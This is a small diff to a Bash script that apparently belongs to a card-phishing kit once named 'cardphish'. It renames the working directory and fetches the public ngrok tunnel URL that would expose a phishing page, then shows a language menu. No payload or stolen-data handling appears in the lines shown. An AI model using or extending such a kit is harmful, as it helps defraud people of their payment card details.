@@ -28,7 +28,7 @@ function banner {
 
 function comenzar {
 
-	cd $HOME/cardphish
+	cd $HOME/hacker-cubano
 	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	echo -e "${yellow} SELECCIONE EL LENGUAGE DEL SCRITP${white}\n"
 	echo -e "${yellow}    [${red}01${yellow}]${white}Español      ${yellow}[${red}02${yellow}]${white}Inglés\n"
